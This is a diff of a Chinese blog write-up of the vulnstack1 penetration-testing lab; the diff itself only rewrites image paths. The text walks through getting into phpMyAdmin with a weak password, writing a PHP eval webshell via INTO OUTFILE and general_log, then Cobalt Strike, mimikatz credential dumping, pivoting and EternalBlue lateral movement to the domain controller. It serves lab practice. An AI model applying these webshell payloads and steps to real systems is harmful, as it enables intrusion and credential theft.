@@ -15,45 +15,45 @@
 
 <p>目标开放web服务：192.168.3.27</p>
 <h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>访问目标网站，这里有php探针</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C1.png" alt="image-20200901135926453"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/1.png" alt="image-20200901135926453"></p>
 <p>探针中可以看到该web服务的绝对路径，扫描一下目录，同时还能得知该服务使用的数据库是Mysql</p>
 <p>扫描得到</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C2.png" alt="image-20200901140137381"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/2.png" alt="image-20200901140137381"></p>
 <p>访问phpMyadmin，弱口令<code>root\root</code></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C3.png" alt="image-20200901140304416"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/3.png" alt="image-20200901140304416"></p>
 <p>phpMyadmin这里有两个getshell的思路，参考：<a href="https://www.cnblogs.com/-qing-/p/10692789.html" target="_blank" rel="noopener">Mysql-getshell</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)</span><br><span class="line">select into outfile</span><br><span class="line">select <span class="number">0x3C3F706870206576616C28245F504F53545B636D645D293B203F3E</span> into outfile <span class="string">'C:/phpStudy/www/test1.php'</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C4.png" alt="image-20200901142434516"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/4.png" alt="image-20200901142434516"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">2</span>)</span><br><span class="line">set <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">'C:/phpStudy/www/test2.php'</span>;</span><br><span class="line">SELECT <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C5.png" alt="image-20200901144448565"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/5.png" alt="image-20200901144448565"></p>
 <p>写入成功</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C6.png" alt="image-20200901144536958"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/6.png" alt="image-20200901144536958"></p>
 <p>上线CS</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C7.png" alt="image-20200901145824774"></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C8.png" alt="image-20200901145925870"></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C9.png" alt="image-20200901151337875"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/7.png" alt="image-20200901145824774"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/8.png" alt="image-20200901145925870"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/9.png" alt="image-20200901151337875"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig /all</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C14.png" alt="image-20200901154932159"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/14.png" alt="image-20200901154932159"></p>
 <p>直接dumphash</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C10.png" alt="image-20200901151529448"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/10.png" alt="image-20200901151529448"></p>
 <p>同样的，我们也可以通过运行<code>mimikatz</code>来获得明文密码</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C11.png" alt="image-20200901152026668"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/11.png" alt="image-20200901152026668"></p>
 <p>这里获得了<code>administrator/1qaz@WSX</code></p>
 <p>然后扫描内网，扫描内网，可以使用<code>sock4a</code>模块</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C12.png" alt="image-20200901152231239"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/12.png" alt="image-20200901152231239"></p>
 <p>使用<code>proxychain</code>或者<code>Proxifier</code>将流量转发出来，然后利用<code>msf</code>或者<code>nmap</code>等工具进行扫描</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C13.png" alt="image-20200901152752116"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/13.png" alt="image-20200901152752116"></p>
 <p>也可以使用msf在获得<code>session</code>后，添加静态路由</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C16.png" alt="image-20200901162511223"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/16.png" alt="image-20200901162511223"></p>
 <p>也可以使用CS自身的<code>net view</code>以及<code>portscan</code></p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C15.png" alt="image-20200901155235588"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/15.png" alt="image-20200901155235588"></p>
 <p>我们会发现内网中有三台机子，一个是web服务器，一个是域成员，一个域控</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C17.png" alt="image-20200901162714129"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/17.png" alt="image-20200901162714129"></p>
 <p>都存在永恒之蓝漏洞，445端口都是开着的，因为之前在web服务器中dump出了明文密码，所以域内横向移动一波</p>
-<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/D:%5Chexo%5Cblog%5Chexo%5Csource_posts%5C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1%5C18.png" alt="image-20200901163631533"></p>
+<p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/18.png" alt="image-20200901163631533"></p>
 <p><img src="/2020/09/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack1/19.png" alt="image-20200901164130576"></p>
 <p>获得域控。</p>
 <h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>这个靶机比较简单，稍作记录，主要是用来练习CS的使用。</p>
